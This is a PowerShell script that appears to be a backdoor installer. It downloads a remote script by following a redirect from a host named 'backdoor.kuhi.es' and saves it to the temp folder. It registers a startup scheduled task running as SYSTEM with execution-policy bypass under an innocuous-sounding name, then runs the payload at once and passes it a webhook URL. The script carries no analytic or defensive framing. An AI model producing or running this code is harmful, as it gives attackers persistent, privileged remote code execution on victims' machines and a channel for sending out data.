# Ensure the webhook URL is provided
if (-not $dc) {
    Write-Error "Webhook URL was not provided"
    exit
}

# Function to save the powershell script from a URL in raw format from GitHub
function Save-Script {
    try {
        $response = Invoke-WebRequest -Uri "http://backdoor.kuhi.es" -MaximumRedirection 0 -ErrorAction Ignore
        $url = $response.Headers.Location
        $destino = "$env:TEMP\Powershell\PowershellTask.ps1"
        Write-Output $destino # for testing only        
        New-Item -ItemType Directory -Force -Path "$env:TEMP\Powershell"
        Invoke-WebRequest -Uri $url -OutFile $destino
    }
    catch {
        Write-Error "$_"
    }
}

# Function to create a scheduled task to run the script in every boot
function Set-ScheduledTask {
    try {
        $taskName = "Windows scheduled task for powershell"
        $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Ep Bypass -dc '$dc' -File '$destino'"
        $taskTrigger = New-ScheduledTaskTrigger -AtStartup
        $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd
        $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        $task = Register-ScheduledTask -TaskName $taskName -Action $taskAction -Trigger $taskTrigger -Settings $taskSettings -Principal $taskPrincipal -Force
        $task | Out-Null
    }
    catch {
        Write-Error "$_"
    }
}

# Create a function to run the downloaded script
function Start-Payload {
    try {
        $command = "powershell.exe -Ep Bypass -dc '$dc' -File '$destino'"
        Invoke-Expression $command
    }
    catch {
        Write-Error "$_"
    }
}

# Execute the functions
try {
    Save-Script
    Set-ScheduledTask
    Start-Payload
}
catch {
    Write-Error "An error occurred during script execution"
}
